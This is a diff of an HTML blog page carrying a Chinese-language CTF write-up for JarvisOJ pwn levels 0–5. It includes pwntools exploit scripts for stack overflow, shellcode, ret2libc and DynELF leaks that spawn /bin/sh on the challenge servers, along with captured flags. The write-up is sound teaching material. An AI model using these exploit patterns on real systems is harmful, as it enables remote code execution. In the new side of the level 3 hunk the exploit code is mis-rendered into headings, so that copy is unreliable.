@@ -202,106 +202,92 @@
 
         <div class="post-content">
             <p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg" alt=""></p>
-<h2 id="引言"><a class="markdownIt-Anchor" href="#引言"></a> 引言</h2>
-<p>最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此<br>
-不定期更新</p>
-<a id="more"></a>
-<h1 id="level-0"><a class="markdownIt-Anchor" href="#level-0"></a> level 0</h1>
-<p>很直接地给出了漏洞函数<code>vulnerable_function()</code>以及要溢出跳转到的函数<code>callsystem()</code>其中<code>callsystem()</code>地址为<code>0x400596</code><br>
-<code>read</code>读入512字节但是<code>buf</code>只有0x80大小，很明显的栈溢出构造ROP劫持控制流到<code>callsystem()</code>执行</p>
-<pre class="highlight"><code class="C"><span class="keyword">ssize_t</span> vulnerable_function()
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此<br>不定期更新<br><a id="more"></a></p>
+<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>很直接地给出了漏洞函数<code>vulnerable_function()</code>以及要溢出跳转到的函数<code>callsystem()</code>其中<code>callsystem()</code>地址为<code>0x400596</code><br><code>read</code>读入512字节但是<code>buf</code>只有0x80大小，很明显的栈溢出构造ROP劫持控制流到<code>callsystem()</code>执行</p>
+<pre><code class="lang-C">ssize_t vulnerable_function()
 {
-  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span>
-  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">512u</span>LL);
+  char buf; // [sp+0h] [bp-80h]@1
+  return read(0, &amp;buf, 512uLL);
 }
 </code></pre>
-<p>查看栈结构很容易得知溢出长度是<code>0x80+0x8=0x88</code><br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg" alt=""><br>
-然后劫持到<code>callsystem()</code>的地址<code>0x400596</code>即可<br>
-poc:</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)		
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-payload += p64(<span class="number">0x400596</span>)
-respone(<span class="string">"World\n"</span>,payload)
+<p>查看栈结构很容易得知溢出长度是<code>0x80+0x8=0x88</code><br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg" alt=""><br>然后劫持到<code>callsystem()</code>的地址<code>0x400596</code>即可<br>poc:</p>
+<pre><code class="lang-python">from pwn import * 
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9881)
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)        
+payload = &quot;A&quot;*0x88
+payload += p64(0x400596)
+respone(&quot;World\n&quot;,payload)
 pro.interactive()
 </code></pre>
 <p><strong>Flag: CTF{713ca3944e92180e0ef03171981dcd41}</strong></p>
-<h1 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h1>
-<p>如level0一样，给出漏洞函数</p>
-<pre class="highlight"><code class="C"><span class="keyword">ssize_t</span> vulnerable_function()
+<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>如level0一样，给出漏洞函数</p>
+<pre><code class="lang-C">ssize_t vulnerable_function()
 {
-  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span>
-  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);
-  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);
+  char buf; // [sp+0h] [bp-88h]@1
+  printf(&quot;What&#39;s this:%p?\n&quot;, &amp;buf);
+  return read(0, &amp;buf, 0x100u);
 }
 </code></pre>
-<p>很明显地栈溢出以及提示你栈地址在哪，然后<code>checksec</code>查看保护，NX(堆栈不可执行)保护没开，那很显然思路就是将<code>shellCode</code>写入栈，然后ROP控制指针跳回栈地址执行<code>shellCode</code><br>
-poc:</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./level1")</span>
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)
-context.log_level = <span class="string">'debug'</span>
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-address = pro.recvuntil(<span class="string">'?'</span>)[<span class="number">-11</span>:<span class="number">-1</span>]
-<span class="comment">#print address</span>
-address = int(address,<span class="number">16</span>)
-<span class="keyword">print</span> hex(address)
-payload = asm(shellcraft.sh()).ljust(<span class="number">140</span>,<span class="string">'\x00'</span>)
+<p>很明显地栈溢出以及提示你栈地址在哪，然后<code>checksec</code>查看保护，NX(堆栈不可执行)保护没开，那很显然思路就是将<code>shellCode</code>写入栈，然后ROP控制指针跳回栈地址执行<code>shellCode</code><br>poc:</p>
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./level1&quot;)
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9877)
+context.log_level = &#39;debug&#39;
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
+address = pro.recvuntil(&#39;?&#39;)[-11:-1]
+#print address
+address = int(address,16)
+print hex(address)
+payload = asm(shellcraft.sh()).ljust(140,&#39;\x00&#39;)
 payload += p64(address)
 pro.sendline(payload)
 pro.interactive()
 </code></pre>
 <p><strong>Flag：CTF{82c2aa534a9dede9c3a0045d0fec8617}</strong></p>
-<h1 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> level 2</h1>
-<p>同样给出漏洞函数，其中包含<code>system</code>函数(地址<code>0x804845C</code>)和栈溢出，还给了一个hint――<code>/bin/sh</code>字符串。</p>
-<pre class="highlight"><code class="C"><span class="keyword">ssize_t</span> vulnerable_function()
+<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>同样给出漏洞函数，其中包含<code>system</code>函数(地址<code>0x804845C</code>)和栈溢出，还给了一个hint――<code>/bin/sh</code>字符串。</p>
+<pre><code class="lang-C">ssize_t vulnerable_function()
 {
-  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span>
-  system(<span class="string">"echo Input:"</span>);
-  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);
+  char buf; // [sp+0h] [bp-88h]@1
+  system(&quot;echo Input:&quot;);
+  return read(0, &amp;buf, 0x100u);
 }
 </code></pre>
-<p>思路也就很明了了，栈溢出ROP到system地址，且追加<code>/bin/sh</code>地址进栈，作为<code>system</code>的参数<br>
-poc:</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./level2")</span>
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9878</span>)
-context.log_level = <span class="string">'debug'</span>
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-bin_sh_addr = <span class="number">0x804A024</span>
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-payload += <span class="string">"\x00"</span>*<span class="number">4</span>
-payload += p32(<span class="number">0x804845C</span>)
+<p>思路也就很明了了，栈溢出ROP到system地址，且追加<code>/bin/sh</code>地址进栈，作为<code>system</code>的参数<br>poc:</p>
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./level2&quot;)
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9878)
+context.log_level = &#39;debug&#39;
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
+bin_sh_addr = 0x804A024
+payload = &quot;A&quot;*0x88
+payload += &quot;\x00&quot;*4
+payload += p32(0x804845C)
 payload += p32(bin_sh_addr)
-respone(<span class="string">"Input:\n"</span>,payload)
+respone(&quot;Input:\n&quot;,payload)
 pro.interactive()
 </code></pre>
 <p><strong>FLag: CTF{1759d0cbd854c54ffa886cd9df3a3d52}</strong></p>
-<h1 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h1>
-<p>这次给了<code>libc</code><br>
-老套路，还是给出了漏洞函数，只有栈溢出和<code>write</code>函数</p>
-<pre class="highlight"><code class="C"><span class="keyword">ssize_t</span> vulnerable_function()
+<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>这次给了<code>libc</code><br>老套路，还是给出了漏洞函数，只有栈溢出和<code>write</code>函数</p>
+<pre><code class="lang-C">ssize_t vulnerable_function()
 {
-  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span>
-  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);
-  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);
+  char buf; // [sp+0h] [bp-88h]@1
+  write(1, &quot;Input:\n&quot;, 7u);
+  return read(0, &amp;buf, 0x100u);
 }
 </code></pre>
 <p>这次给出了<code>libc</code>，思路也很明显。</p>
@@ -309,149 +295,99 @@ pro.interactive()
 <li>用<code>write</code>函数泄露出<code>write</code>的真实内存地址(通过泄露got表中对应的write条目实现)</li>
 <li>然后利用<code>write</code>函数真实内存地址减去给的<code>libc</code>中<code>write</code>函数的偏移得到<code>imageBase</code></li>
 <li>最后<code>imageBase</code>加上<code>libc</code>中<code>system</code>的偏移就是真实内存地址了，<code>/bin/sh</code>地址同理。</li>
-<li>构造ROP执行<code>system</code><br>
-详细控制过程看poc注释<br>
-poc:</li>
+<li>构造ROP执行<code>system</code><br>详细控制过程看poc注释<br>poc:<br>``` python<br>from pwn import * <h1 id="pro-process-“-level3”"><a href="#pro-process-“-level3”" class="headerlink" title="pro = process(“./level3”)"></a>pro = process(“./level3”)</h1>pro = remote(“pwn2.jarvisoj.com”, 9879)<br>context.log_level = ‘debug’<br>libc = ELF(“./libc-2.19.so”)<br>elf = ELF(“./level3”)<br>def respone(recv_buf,send_buf,new_line=True):<br> pro.recvuntil(recv_buf)<br> if new_line:<pre><code> pro.sendline(send_buf)
+</code></pre> else:<pre><code> pro.send(send_buf)
+</code></pre></li>
 </ol>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./level3")</span>
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9879</span>)
-context.log_level = <span class="string">'debug'</span>
-libc = ELF(<span class="string">"./libc-2.19.so"</span>)
-elf = ELF(<span class="string">"./level3"</span>)
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-		
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-payload += <span class="string">"\x00\x00\x00\x00"</span>
-payload += p32(elf.plt[<span class="string">'write'</span>])<span class="comment">#跳到write plt执行write函数</span>
-payload +=p32(<span class="number">0x8048495</span>)<span class="comment">#执行完write之后的返回地址，此处为vulnerable_function()地址</span>
-payload +=p32(<span class="number">1</span>)<span class="comment">#arg1</span>
-payload +=p32(elf.got[<span class="string">'write'</span>])<span class="comment">#arg2</span>
-payload +=p32(<span class="number">4</span>)<span class="comment">#arg3</span>
-<span class="comment">#得到write的真实内存地址</span>
-respone(<span class="string">"Input:\n"</span>,payload)
-write_addr = u32(pro.recv(<span class="number">4</span>))
+<p>payload = “A”*0x88<br>payload += “\x00\x00\x00\x00”<br>payload += p32(elf.plt[‘write’])#跳到write plt执行write函数<br>payload +=p32(0x8048495)#执行完write之后的返回地址，此处为vulnerable_function()地址<br>payload +=p32(1)#arg1<br>payload +=p32(elf.got[‘write’])#arg2<br>payload +=p32(4)#arg3</p>
+<h1 id="得到write的真实内存地址"><a href="#得到write的真实内存地址" class="headerlink" title="得到write的真实内存地址"></a>得到write的真实内存地址</h1><p>respone(“Input:\n”,payload)<br>write_addr = u32(pro.recv(4))</p>
+<h1 id="通过libc中函数之前偏移，计算system地址和字符串”-bin-sh”地址"><a href="#通过libc中函数之前偏移，计算system地址和字符串”-bin-sh”地址" class="headerlink" title="通过libc中函数之前偏移，计算system地址和字符串”/bin/sh”地址"></a>通过libc中函数之前偏移，计算system地址和字符串”/bin/sh”地址</h1><p>log.info(“write_addr:%s”,hex(write_addr))<br>imageBase = write_addr - libc.symbols[‘write’]#得到libc内存加载基址<br>log.info(“imageBase:%s”,hex(imageBase))<br>system_addr = imageBase + libc.symbols[‘system’]#计算system真实地址<br>bin_sh_addr = imageBase + next(libc.search(‘/bin/sh’))#计算/bin/sh真实地址<br>log.info(“system_addr:%s”,hex(system_addr))<br>log.info(“bin_sh_addr:%s”,hex(bin_sh_addr))<br>payload = “A”*0x88<br>payload += “\x00\x00\x00\x00”<br>payload += p32(system_addr)#劫持到system地址<br>payload += p32(0xf)#随便给个调用完system后的返回地址<br>payload +=p32(bin_sh_addr)#arg1<br>respone(“Input:\n”,payload)#再次溢出<br>pro.interactive()</p>
+<pre><code>**Flag: CTF{d85346df5770f56f69025bc3f5f1d3d0}**
+# level 4
 
-<span class="comment">#通过libc中函数之前偏移，计算system地址和字符串"/bin/sh"地址</span>
-log.info(<span class="string">"write_addr:%s"</span>,hex(write_addr))
-imageBase = write_addr - libc.symbols[<span class="string">'write'</span>]<span class="comment">#得到libc内存加载基址</span>
-log.info(<span class="string">"imageBase:%s"</span>,hex(imageBase))
-system_addr = imageBase + libc.symbols[<span class="string">'system'</span>]<span class="comment">#计算system真实地址</span>
-bin_sh_addr = imageBase + next(libc.search(<span class="string">'/bin/sh'</span>))<span class="comment">#计算/bin/sh真实地址</span>
-log.info(<span class="string">"system_addr:%s"</span>,hex(system_addr))
-log.info(<span class="string">"bin_sh_addr:%s"</span>,hex(bin_sh_addr))
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-payload += <span class="string">"\x00\x00\x00\x00"</span>
-payload += p32(system_addr)<span class="comment">#劫持到system地址</span>
-payload += p32(<span class="number">0xf</span>)<span class="comment">#随便给个调用完system后的返回地址</span>
-payload +=p32(bin_sh_addr)<span class="comment">#arg1</span>
-respone(<span class="string">"Input:\n"</span>,payload)<span class="comment">#再次溢出</span>
-pro.interactive()
-</code></pre>
-<p><strong>Flag: CTF{d85346df5770f56f69025bc3f5f1d3d0}</strong></p>
-<h1 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h1>
-<p>一样给出存在溢出漏洞的函数,但是没有给<code>libc</code>和其他任何提示<br>
-plt中存在<code>read</code>和<code>write</code>函数</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-30-17.jpg" alt=""></p>
-<pre class="highlight"><code class="C"><span class="keyword">ssize_t</span> vulnerable_function()
+一样给出存在溢出漏洞的函数,但是没有给`libc`和其他任何提示
+plt中存在`read`和`write`函数
+
+![](JarvisOJ-PWN-Writeup专题/19-30-17.jpg)
+``` C
+ssize_t vulnerable_function()
 {
-  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span>
-  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);
+  char buf; // [sp+0h] [bp-88h]@1
+  return read(0, &amp;buf, 0x100u);
 }
-</code></pre>
-<p>既然这样，我们只能在无<code>libc</code>的情况下的ROP<br>
-我们有两个选择</p>
+</code></pre><p>既然这样，我们只能在无<code>libc</code>的情况下的ROP<br>我们有两个选择</p>
 <blockquote>
 <ol>
-<li>利用write函数泄露内存，加上pwntools中的DynELF函数遍历got表，猜解lic版本和system函数及&quot;/bin/sh&quot;字符串的位置，然后ROP起shell</li>
-<li>利用read函数将&quot;/bin/sh&quot;字符串写入可写位置，然后利用read函数中的syscall起shell</li>
+<li>利用write函数泄露内存，加上pwntools中的DynELF函数遍历got表，猜解lic版本和system函数及”/bin/sh”字符串的位置，然后ROP起shell</li>
+<li>利用read函数将”/bin/sh”字符串写入可写位置，然后利用read函数中的syscall起shell</li>
 </ol>
 </blockquote>
 <p>解释一下两个方法的原理：</p>
-<h2 id="方法一"><a class="markdownIt-Anchor" href="#方法一"></a> 方法一</h2>
-<p><code>write</code>函数泄露指定地址内存这个就不说了，上面的题目都有，最主要解释一下pwntools中的DynELF函数的原理<br>
-pwntools中的DynELF是利用可循环利用的泄露内存函数去遍历获取程序got表中的所有函数的真实内存地址，然后通过地址低12位猜测是哪个版本的libc，如果找得到对应版本就用内存地址减去对应函数偏移得到libc加载的基地址，匹配不到就GG</p>
-<h2 id="方法二"><a class="markdownIt-Anchor" href="#方法二"></a> 方法二</h2>
-<p><code>read</code>函数写入指定可写地址原理也不提了，read中的syscall是重点<br>
-这是我最近做了几次类似的题才领悟的，起初看别的大佬wp并不明白为啥是这样。在libc的read函数中，一般会在<code>&lt;read+14&gt;</code>的位置存在一个syscall调用。猜测可能是大部分或者部分libc的通用代码，所以才造就了这个固定的位置存在<code>syscall</code>调用。所以我们只要泄露了<code>read</code>函数的真实内存地址，加上固定偏移<code>0xe</code>就能得到<code>syscall</code>的真实内存地址，即使开了ASLR，也不会改变低位的地址，所以这个方法也同样适用。然后就是正常的ROP，用gadget控制传入参数，然后跳到<code>syscall</code>地址就好了<br>
-32位程序需要将eax=0xb，ebx=&quot;/bin/sh&quot;字符串地址,ecx=0,edx=0,然后调用<code>syscall</code><br>
-64位则需要将rdi=&quot;/bin/sh&quot;字符串地址,rsi=0,rdx=0,然后同样调用<code>syscall</code><br>
-我则采用方法一写的poc(因为方法二的成功率看起来并不是很高，在没有办法的时候可采用)</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./level4")</span>
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9880</span>)
-<span class="comment">#context.log_level = 'debug'</span>
-elf = ELF(<span class="string">"./level4"</span>)
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-<span class="comment">#泄露内存函数</span>
-<span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span>
-	payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-	payload += <span class="string">"\x00\x00\x00\x00"</span>
-	payload += p32(elf.plt[<span class="string">'write'</span>])
-	payload +=p32(<span class="number">0x0804844B</span>) <span class="comment">#return read Address，回到vulnerable_function</span>
-	payload +=p32(<span class="number">1</span>)<span class="comment">#arg1</span>
-	payload +=p32(address)<span class="comment">#arg2</span>
-	payload +=p32(<span class="number">4</span>)<span class="comment">#arg3</span>
-	pro.sendline(payload)
-	data  = pro.recv(<span class="number">4</span>)
-	<span class="keyword">return</span> data
-	
-d = DynELF(leak,elf=ELF(<span class="string">"./level4"</span>))
-system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><code>write</code>函数泄露指定地址内存这个就不说了，上面的题目都有，最主要解释一下pwntools中的DynELF函数的原理<br>pwntools中的DynELF是利用可循环利用的泄露内存函数去遍历获取程序got表中的所有函数的真实内存地址，然后通过地址低12位猜测是哪个版本的libc，如果找得到对应版本就用内存地址减去对应函数偏移得到libc加载的基地址，匹配不到就GG</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p><code>read</code>函数写入指定可写地址原理也不提了，read中的syscall是重点<br>这是我最近做了几次类似的题才领悟的，起初看别的大佬wp并不明白为啥是这样。在libc的read函数中，一般会在<code>&lt;read+14&gt;</code>的位置存在一个syscall调用。猜测可能是大部分或者部分libc的通用代码，所以才造就了这个固定的位置存在<code>syscall</code>调用。所以我们只要泄露了<code>read</code>函数的真实内存地址，加上固定偏移<code>0xe</code>就能得到<code>syscall</code>的真实内存地址，即使开了ASLR，也不会改变低位的地址，所以这个方法也同样适用。然后就是正常的ROP，用gadget控制传入参数，然后跳到<code>syscall</code>地址就好了<br>32位程序需要将eax=0xb，ebx=”/bin/sh”字符串地址,ecx=0,edx=0,然后调用<code>syscall</code><br>64位则需要将rdi=”/bin/sh”字符串地址,rsi=0,rdx=0,,然后同样调用<code>syscall</code><br>我则采用方法一写的poc(因为方法二的成功率看起来并不是很高，在没有办法的时候可采用)</p>
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./level4&quot;)
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9880)
+#context.log_level = &#39;debug&#39;
+elf = ELF(&quot;./level4&quot;)
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
+#泄露内存函数
+def leak(address):
+    payload = &quot;A&quot;*0x88
+    payload += &quot;\x00\x00\x00\x00&quot;
+    payload += p32(elf.plt[&#39;write&#39;])
+    payload +=p32(0x0804844B) #return read Address，回到vulnerable_function
+    payload +=p32(1)#arg1
+    payload +=p32(address)#arg2
+    payload +=p32(4)#arg3
+    pro.sendline(payload)
+    data  = pro.recv(4)
+    return data
+
+d = DynELF(leak,elf=ELF(&quot;./level4&quot;))
+system_addr = d.lookup(&quot;system&quot;,&quot;libc&quot;)
 log.info(hex(system_addr))
 
-data_bin_sh_addr =  <span class="number">0x804a01c</span>
-pop_3_ret_addr = <span class="number">0x8048509</span>
+data_bin_sh_addr =  0x804a01c
+pop_3_ret_addr = 0x8048509
 
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-payload += <span class="string">"\x00\x00\x00\x00"</span>
-payload += p32(elf.plt[<span class="string">'read'</span>])
-payload +=p32(pop_3_ret_addr) <span class="comment">#32位程序需要堆栈平衡，不然read的三个参数会一直留在栈上</span>
-payload +=p32(<span class="number">0</span>)
+payload = &quot;A&quot;*0x88
+payload += &quot;\x00\x00\x00\x00&quot;
+payload += p32(elf.plt[&#39;read&#39;])
+payload +=p32(pop_3_ret_addr) #32位程序需要堆栈平衡，不然read的三个参数会一直留在栈上
+payload +=p32(0)
 payload +=p32(data_bin_sh_addr)
-payload +=p32(<span class="number">8</span>)
-<span class="comment">#堆栈平衡后继续劫持到system_addr</span>
+payload +=p32(8)
+#堆栈平衡后继续劫持到system_addr
 payload += p32(system_addr)
-payload +=p32(<span class="number">0xf</span>)<span class="comment">#随便一个返回地址</span>
-payload +=p32(data_bin_sh_addr)<span class="comment">#/bin/sh字符串地址</span>
+payload +=p32(0xf)#随便一个返回地址
+payload +=p32(data_bin_sh_addr)#/bin/sh字符串地址
 
 pro.sendline(payload)
-pro.sendline(<span class="string">'/bin/sh\x00'</span>)
+pro.sendline(&#39;/bin/sh\x00&#39;)
 pro.interactive()
 </code></pre>
-<p>注意到<code>leak</code>函数并没有进行堆栈平衡，<code>leak</code>的执行会让栈空间一直往低地址增长，一次多三个参数。更好的<code>payload</code>应该是要做堆栈平衡，以免<code>leak</code>函数执行次数过多，造成不可预知意外<br>
-<strong>Flag: CTF{882130cf51d65fb705440b218e94e98e}</strong></p>
-<h1 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h1>
-<p>这次换成了64位的程序，和接下来的<code>level3 x64</code>的附件是一样的，包括程序和<code>libc</code><br>
-这次仍然给出了一个具有栈溢出漏洞的函数,但是题目要求假设<code>system</code>和<code>execve</code>被禁用，利用<code>mprotect</code>和<code>mmap</code>来解决</p>
-<pre class="highlight"><code class="C"><span class="keyword">ssize_t</span> vulnerable_function()
+<p>注意到<code>leak</code>函数并没有进行堆栈平衡，<code>leak</code>的执行会让栈空间一直往低地址增长，一次多三个参数。更好的<code>payload</code>应该是要做堆栈平衡，以免<code>leak</code>函数执行次数过多，造成不可预知意外<br><strong>Flag: CTF{882130cf51d65fb705440b218e94e98e}</strong></p>
+<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>这次换成了64位的程序，和接下来的<code>level3 x64</code>的附件是一样的，包括程序和<code>libc</code><br>这次仍然给出了一个具有栈溢出漏洞的函数,但是题目要求假设<code>system</code>和<code>execve</code>被禁用，利用<code>mprotect</code>和<code>mmap</code>来解决</p>
+<pre><code class="lang-C">ssize_t vulnerable_function()
 {
-  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span>
-  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>LL);
-  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);
+  char buf; // [sp+0h] [bp-80h]@1
+  write(1, &quot;Input:\n&quot;, 7uLL);
+  return read(0, &amp;buf, 0x200uLL);
 }
 </code></pre>
 <p>先来了解一下<code>mprotect</code>和<code>mmap</code>函数</p>
-<h2 id="mprotect"><a class="markdownIt-Anchor" href="#mprotect"></a> mprotect</h2>
-<pre class="highlight"><code class="C"> <span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>; 
+<h2 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h2><pre><code class="lang-C"> int mprotect(const void *start, size_t len, int prot);
 </code></pre>
-<p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。<br>
-mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值,就是常见的0x111对应执行，写，读权限</p>
+<p> 在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值,就是常见的0x111对应执行，写，读权限</p>
 <pre><code> 需要注意的是第一个参数――起始地址`start`必须是内存对齐的地址，且第二参数`len`也是内存对齐Align的整数倍。linux64bit默认内存对齐长度是0x1000(4096),32bit则是0x400(1024)。一开始没注意到这个，浪费了不少时间。
+</code></pre><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><pre><code class="lang-C">void *mmap( void *start , size_t length , int prot , int flags , int fd , off_t offsize)
 </code></pre>
-<h2 id="mmap"><a class="markdownIt-Anchor" href="#mmap"></a> mmap</h2>
-<pre class="highlight"><code class="C"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">( <span class="keyword">void</span> *start , <span class="keyword">size_t</span> length , <span class="keyword">int</span> prot , <span class="keyword">int</span> flags , <span class="keyword">int</span> fd , <span class="keyword">off_t</span> offsize)</span>
-</span></code></pre>
 <p>参数start：</p>
 <ul>
 <li>指向欲映像的内存起始地址，通常设为NULL，代表让系统自动标明地址，映像成功后返回该地址。</li>
@@ -474,10 +410,8 @@ mprotect()函数把自start开始的、长度为len的内存区的保护属性�
 <li>MAP_PRIVATE：对映像区域的写入操作会产生一个映像文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。当共享的对象的虚拟存储区域为私有对象时，修改只会被本进程中改变。<em>（学的操作系统终于派上用场了）</em></li>
 <li>MAP_ANONYMOUS：建立匿名映像。此时会忽略参数fd，不涉及文件，而且映像区域无法和其他进程共享。</li>
 <li>MAP_DENYWRITE：只允许对映像区域的写入操作，其他对文件直接写入的操作将会被拒绝。</li>
-<li>MAP_LOCKED：将映像区域锁定住，这表示该区域不会被置换（swap）。<br>
-参数fd：</li>
-<li>要映像到内存中的文件描述符。如果使用匿名内存映像时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映像，则可以使用fopen打开/dev/zero文件，然后对该文件进行映像，可以同样达到匿名内存映像的效果。<br>
-参数offset：</li>
+<li>MAP_LOCKED：将映像区域锁定住，这表示该区域不会被置换（swap）。<br>参数fd：</li>
+<li>要映像到内存中的文件描述符。如果使用匿名内存映像时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映像，则可以使用fopen打开/dev/zero文件，然后对该文件进行映像，可以同样达到匿名内存映像的效果。<br>参数offset：</li>
 <li>文件映像的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</li>
 </ul>
 <p>返回值：</p>
@@ -485,24 +419,15 @@ mprotect()函数把自start开始的、长度为len的内存区的保护属性�
 <li>若映像成功则返回映像区的内存起始地址，否则返回MAP_FAILED（－1），错误原因存于errno中。</li>
 </ul>
 <p>上一张图说明mmap的具体作用是什么：</p>
